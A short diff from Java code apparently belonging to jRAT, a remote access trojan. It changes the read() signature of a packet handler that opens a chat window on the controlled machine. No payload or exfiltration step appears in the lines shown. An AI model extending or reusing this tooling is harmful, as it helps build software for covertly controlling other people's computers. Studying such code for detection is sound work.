@@ -6,7 +6,7 @@ import se.jrat.stub.FrameChat;
 public class Packet48ChatStart extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		Connection.instance.setFrameChat(new FrameChat());
 		Connection.instance.getFrameChat().setVisible(true);
 	}
